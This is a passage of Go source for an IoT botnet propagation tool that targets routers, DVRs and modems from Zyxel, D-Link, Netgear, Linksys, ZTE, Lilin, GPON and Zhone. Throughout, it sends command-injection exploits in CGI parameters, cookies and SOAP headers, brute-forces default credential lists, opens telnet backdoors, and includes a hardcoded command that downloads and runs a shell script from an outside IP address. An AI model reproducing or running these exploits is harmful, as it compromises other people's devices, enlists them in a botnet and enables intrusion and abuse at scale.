    conn.Write([]byte("GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bls+%23&password=asdf HTTP/1.1\r\nHost: " + target + "\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

    for {
        tmpbuf := make([]byte, 128)
        ln, err := conn.Read(tmpbuf)
        if ln <= 0 || err != nil {
            break
        }

        rdbuf = append(rdbuf, tmpbuf...)
        if strings.Contains(string(rdbuf), "errcode:5") {
            conn.Write([]byte("GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3B" + zyxelPayload + "+%23&password=asdf HTTP/1.1\r\nHost: " + target + "\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: " + userAgent + "\r\n\r\n"))
            fmt.Printf("\x1b[38;5;46mZyxel\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
            payloadSent++
            break
        }
    }

    zeroByte(rdbuf)
    conn.Close()
}
*/

func zyxelVerifyBot(target, location string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	conn.SetDeadline(time.Now().Add(timeout))

	defer conn.Close()

	request := fmt.Sprintf("GET %s HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nHost: "+target+"\r\nUser-Agent: "+userAgent+"\r\n\r\n", location)
	conn.Write([]byte(request))

	for {
		buff := make([]byte, 1024)

		pLen, err := conn.Read(buff)

		if err != nil {
			return false
		}

		if pLen <= 0 {
			return false
		}

		if strings.Contains(string(buff), "/adv,/index.html") {
			return true
		}
	}

	return false
}

func zyxelCheckBot(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	conn.SetDeadline(time.Now().Add(timeout))

	defer conn.Close()

	request := fmt.Sprintf("GET / HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n")
	conn.Write([]byte(request))

	for {
		buff := make([]byte, 1024)

		pLen, err := conn.Read(buff)

		if err != nil {
			return ""
		}

		if pLen <= 0 {
			return ""
		}

		if strings.Contains(string(buff), "playzone") && strings.Contains(string(buff), "301") {
			locationStr := strings.Split(string(buff), "Location: ")

			if len(locationStr) > 1 {
				location := strings.Split(locationStr[1], "\r\n")

				if len(location) > 0 {
					return location[0]
				}
			}
		}
	}

	return ""
}

func zyxelInfect(target string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	conn.SetDeadline(time.Now().Add(timeout))

	defer conn.Close()

	conn.Write([]byte("GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3B" + zyxelPayload + "&password=asdf HTTP/1.0\r\nUser-Agent: " + userAgent + "\r\n\r\n"))
}

func infectFunctionZyxel(target string) {
	location := zyxelCheckBot(target)

	if location == "" {
		return
	}

	location = strings.Replace(location, "http://"+target, "", -1)
	location = strings.Replace(location, "https://"+target, "", -1)

	if !zyxelVerifyBot(target, location) {
		return
	}

	fmt.Printf("\x1b[38;5;46mZyxel:%s\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", location, target)
	payloadSent++

	logDevice(target, "zyxel")

	zyxelInfect(target)
}

func infectFunctionAlcatel(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET /cgi-bin/masterCGI?ping=nomip&user=;" + alcatelPayload + "; HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionLilinDvr(target string) {

	var authPos int = -1
	var pathPos int = -1
	var logins = [...]string{"root:icatch99", "report:8Jg0SR8K50", "default:tluafed", "root:hi3518", "root:xmhdipc", "default:OxhlwSG8", "default:S2fGqNFs", "default:pYmGZYBJ", "default:I0TO5Wv9", "default:bKdIrdV6", "default:ok0TJuQM", "default:kBny7nWP", "default:mIj8PVHx", "default:37vh15ns", "default:RJmARUve", "default:apWrl1sk", "default:1OAZMJJt", "root:jvbzd", "root:klv123", "root:xc3511", "root:hslwificam", "root:1234", "root:12345", "root:123465", "admin:admin", "admin:123456", "root:123456", "admin:user", "admin:1234", "admin:password", "admin:12345", "admin:0000", "admin:1111", "admin:1234567890", "admin:123", "admin:", "admin:666666"}
	var paths = [...]string{"/dvr/cmd", "/cn/cmd"}

	for i := 0; i < len(logins); i++ {
		logins[i] = base64.StdEncoding.EncodeToString([]byte(logins[i]))
	}

	cntLen := 292
	cntLen += len(lilinPayload)
	cntLenString := strconv.Itoa(cntLen)
	bytebuf := make([]byte, 512)

	for i := 0; i < len(logins); i++ {

		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			break
		}

		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nAuthorization: Basic " + logins[i] + "\r\n\r\n"))

		bytebuf := make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			return
		}

		if strings.Contains(string(bytebuf), ",/playzone,/") {
			zeroByte(bytebuf)
			conn.Close()
			return
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
			authPos = i
			zeroByte(bytebuf)
			conn.Close()
			break
		} else {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}
	}

	if authPos == -1 {
		return
	}

	for i := 0; i < len(paths); i++ {

		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			break
		}

		conn.Write([]byte("POST " + paths[i] + " HTTP/1.1\r\nHost: " + target + "\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: " + cntLenString + "\r\nAuthorization: Basic " + logins[authPos] + "\r\nUser-Agent: " + userAgent + "\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov&" + lilinPayload + ";echo DONE\"/></Service></DVR>]]></SetConfiguration></DVR>\r\n\r\n"))

		bytebuf := make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
			pathPos = i
			zeroByte(bytebuf)
			conn.Close()

			auth, _ := base64.StdEncoding.DecodeString(logins[authPos])
			fmt.Printf("\x1b[38;5;46mLilin\x1b[38;5;15m: \x1b[38;5;134m%s:%s:%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target, auth, paths[pathPos])
			payloadSent++
			break
		} else {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}
	}

	if pathPos != -1 {

		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			return
		}

		conn.Write([]byte("POST " + paths[pathPos] + " HTTP/1.1\r\nHost: " + target + "\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: 281\r\nAuthorization: Basic " + logins[authPos] + "\r\nUser-Agent: " + userAgent + "\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov\"/></Service></DVR>]]></SetConfiguration></DVR>\r\n\r\n"))

		bytebuf = make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			return
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
			auth, _ := base64.StdEncoding.DecodeString(logins[authPos])
			fmt.Printf("\x1b[38;5;46mLilin\x1b[38;5;15m: \x1b[38;5;134m%s:%s:%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target, auth, paths[pathPos])
			payloadSent++
		}

		zeroByte(bytebuf)
		conn.Close()
	}

	return
}

func infectFunctionLinksys(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 102
	cntLen += len(linksysPayload)

	cntLneStr := strconv.Itoa(cntLen)

	conn.Write([]byte("POST /tmUnblock.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: " + cntLneStr + "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nsubmit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h+%60" + linksysPayload + "%60&StartEPI=1\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	if strings.Contains(string(tmpbuf), "200") || strings.Contains(string(tmpbuf), "301") || strings.Contains(string(tmpbuf), "302") {
		fmt.Printf("\x1b[38;5;46mLinksys\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionMagic(target string) {

	ipslit := strings.Split(target, ":")

	for i := 0; i < len(magicPorts); i++ {
		portVal := strconv.Itoa(magicPorts[i])
		magicGroup.Add(1)
		go infectFunctionMagicProto(ipslit[0] + ":" + portVal)
	}

	magicGroup.Wait()
}

func infectFunctionDlink(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	rand.Seed(time.Now().UnixNano())
	telnetPort := rand.Intn(50000) + 10000

	conn.Write([]byte("POST /command.php HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 24\r\n\r\ncmd=telnetd%20-p%20" + strconv.Itoa(telnetPort) + "\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	time.Sleep(10 * time.Second)
	ipslit := strings.Split(target, ":")
	go telnetLoader(ipslit[0]+":"+strconv.Itoa(telnetPort), 0, "mips", loaderDlinkTag, "")
	go telnetLoader(ipslit[0]+":"+strconv.Itoa(telnetPort), 0, "mpsl", loaderDlinkTag, "")
	go telnetLoader(ipslit[0]+":"+strconv.Itoa(telnetPort), 0, "arm7", loaderDlinkTag, "")
	go telnetLoader(ipslit[0]+":"+strconv.Itoa(telnetPort), 0, "arm", loaderDlinkTag, "pkill -9 telnetd; killall telnetd")
	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionZyxelTwo(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 119
	cntLen += len(zyxelPayloadTwo)

	conn.Write([]byte("POST /cgi-bin/ViewLog.asp HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nremote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3B" + zyxelPayloadTwo + "%3B%23&remoteSubmit=Save^[[A\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionNetgear(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 42
	cntLen += len(netgearPayload)

	conn.Write([]byte("POST /dnslookup.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\nhost_name=www.google.com%3B+" + netgearPayload + "&lookup=Lookup\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionZte(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 80
	cntLen += len(zteNewPayload)

	conn.Write([]byte("POST /web_shell_cmd.gch HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nIF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=" + zteNewPayload + "&CmdAck=\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionNetgearTwo(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET /None?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;" + netgearPayload + ";%20echo%20 HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionNetgearThree(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 81
	cntLen += len(netgearPayload)

	conn.Write([]byte("POST /ping.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nreferer: " + target + "/DIAG_diag.htm\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\nIPAddr1=12&IPAddr2=12&IPAddr3=12&IPAddr4=12&ping=Ping&ping_IPAddr=12.12.12.12%3B+" + netgearPayload + "\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionNetgearFour(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET /cgi-bin/;" + netgearPayload + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infeftFunctionNetgearFive(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s/netgear+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionGponOG(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 68
	cntLen += len(gponOGPayload)

	conn.Write([]byte("POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=%60" + gponOGPayload + "&ipv=0\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionLinksysTwo(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 159
	cntLen += len(linksysTwoPayload)

	conn.Write([]byte("POST /apply.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\nsubmit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=127.0.0.1&ping_size=%26" + linksysTwoPayload + "&ping_times=5&traceroute_ip=127.0.0.1\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionLinksysThree(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 23
	cntLen += len(linksysTwoPayload)

	conn.Write([]byte("POST /debug.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Basic R2VtdGVrOmdlbXRla3N3ZA==\r\n\r\ndata1=" + linksysTwoPayload + "&command=ui_debug\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionDlinkTwo(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 91
	cntLen += len(dlinkTwoPayload)

	conn.Write([]byte("POST /setSystemCommand HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nAuthorization: Basic YWRtaW46\r\n\r\nReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm&SystemCommand=" + dlinkTwoPayload + "&ConfigSystemCommand=Save\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func checkDlinkThree(target string) bool {

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return false
	}

	var cntLen int = 20
	cntLen += len(dlinkTwoPayload)

	defer conn.Close()

	conn.Write([]byte("GET /diagnostic.php HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nConnection: keep-alive\r\nDNT: 1\r\n\r\n"))

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if len <= 0 {
			break
		}

		if err != nil {
			break
		}

		if strings.Contains(string(buff), "<diagnostic>") {
			return true
		}
	}

	return false
}

func infectFunctionDlinkThree(target string) {

	if !checkDlinkThree(target) {
		return
	}

	fmt.Printf("\x1b[38;5;46mDlink-DIR\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m found device\x1b[38;5;15m\r\n", target)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	var cntLen int = 20
	cntLen += len(dlinkTwoPayload)

	defer conn.Close()

	conn.Write([]byte("POST /diagnostic.php HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\n\r\nact=ping&dst=%26 " + dlinkTwoPayload + "%26\r\n\r\n"))

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if len <= 0 {
			break
		}

		if err != nil {
			break
		}

		if strings.Contains(string(buff), "<diagnostic>") {
			return
		}
	}
}

func infectFunctionDlinkFour(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET /cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;" + dlinkTwoPayload + ";echo%207yeB8BQB2ycGRCT8LmsmttUWPggWykhK; HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionDlinkFive(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET /login.cgi?cli=multilingual%20show';" + dlinkTwoPayload + "'$ HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionDlinkSix(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nCookie: i=`" + dlinkTwoPayload + "`\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionDlinkSeven(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("POST /hedwig.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: uid=uAMwOEeRuqDZptt4JHrQuakNv2g3eR9kqnvDUvAkaRD561YFVty3uXFAls6bcARYA5w5KpUrDlY7pdAXuG0AuhHSfBCQJoPDqxdjszcAWwQYxOEf6Sy9t8iU4PV1xNyVxDMPqZwR7a5dthsW8jLiK0ha1qUksjWYna5IaYoOYIM7aiT3mrseuskJWVONKXFQQw64tNsAAmrfIc9OobZ4gxQibsOsHkZoqz5C1ScGYmMaWeICXuF1J2R1FIzGkXOr3OXjKXQ8C6ZeSbRRmEBF8GaJPJ87wiVlDAXj6QsyKSWDzjqTWqS9rxBnx39xwO9e02kJibbjxAW93SsX7rfKmUH4hN0H1j8dqYGhpPWL0CSELCM7NwWSjs5ofrkRivAE5bI3rnlSsMeyvPGmRjGhSH6Z5kWDAVQ5bUztFAALVyl0nPl9fl2FgmLNCPmqx9VMNMsFTnOfv4hVP9wNiN1WYTeHRCrLeB9THv1uzipH8utX2Y7Cv5iaxSMYZOUVG2puqPAYc2QzfdkEgrIOuIOZIUXQvYGF35rIkMW8eYuiVKqejKbXaM8B6RfiBTCTAHJpRMnkp5L9HorqZNwX6lpyH62slJG4iS3Yz31SrgBV5PDANkFw92G6qtT8kvbHfzoI2kyJKQa67TSDHhZLgfUHMsFFLwZTZwiXlZIzDFimYbdTaz8KWF0POFoqyGs5oynMDic8VvwS2rGsALvVHYWa885i4CIrwyEOnkY6Mqvmv96osjP1Br3GWARZPpnwGoWc7dVLvZVDLW1ObRFg1bX8qDUdxv4jcGGwZdK5wz2bJoNoyEWIkFVcQldDxjaQNdokjCmJxoEGRUGYyZshnx1fYqLH3Mc3K9DcB7xhZdbdBAohXpzYr7OXpTFHZp7THrBE1i8VvvoaF1bBXsBrasf4fwYtVUrtgPHVnlq1oN2uoO6qfLZLz49u1QxK6qBGsQG2pJa6rxYmcHEPt   *vk3aG0Vgy2692qgW ?*crxdla7qucxf ?*qzoFOTyzL063ZRDecd /tmp;wget http://37.0.11.220/a/1.sh;chmod 777 1.sh;sh 1.sh dlink;rm -rf 1.sh;\r\nContent-Length: 15\r\n\r\nL0PTJUj=NX9zke5\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectFunctionDlinkEight(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("POST /HNAP1/ HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nSOAPAction: \"http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && " + dlinkThreePayload + "`\"\r\nContent-Length: 0\r\n\r\n"))

	tmpbuf := make([]byte, 128)
	ln, err := conn.Read(tmpbuf)
	if ln <= 0 || err != nil {
		conn.Close()
	}

	zeroByte(rdbuf)
	conn.Close()
}

func infectZhone(target string) {
	var sessionKey string
	var isAuted int = 0
	var authPos int = 0
	var login string

	var logins = [...]string{"admin:admin", "admin:cciadmin", "Admin:Admin", "user:user", "admin:zhone", "vodafone:vodafone"}

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	setWriteTimeout(conn, 10)
	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	setReadTimeout(conn, 10)
	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)

	if err != nil || l <= 0 {
		zeroByte(bytebuf)
		conn.Close()
		return
	}

	if strings.Contains(string(bytebuf), "401 Unauthorized") && strings.Contains(string(bytebuf), "Basic realm=") {
	} else {
		zeroByte(bytebuf)
		conn.Close()
		return
	}

	zeroByte(bytebuf)
	conn.Close()

	for i := 0; i < len(logins); i++ {
		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			break
		}

		auth := base64.StdEncoding.EncodeToString([]byte(logins[i]))
		login = logins[i]

		setWriteTimeout(conn, 10)
		conn.Write([]byte("GET /zhnping.html HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http:// " + target + "/menu.html\r\nAuthorization: Basic " + auth + "\r\n\r\n"))

		setReadTimeout(conn, 10)
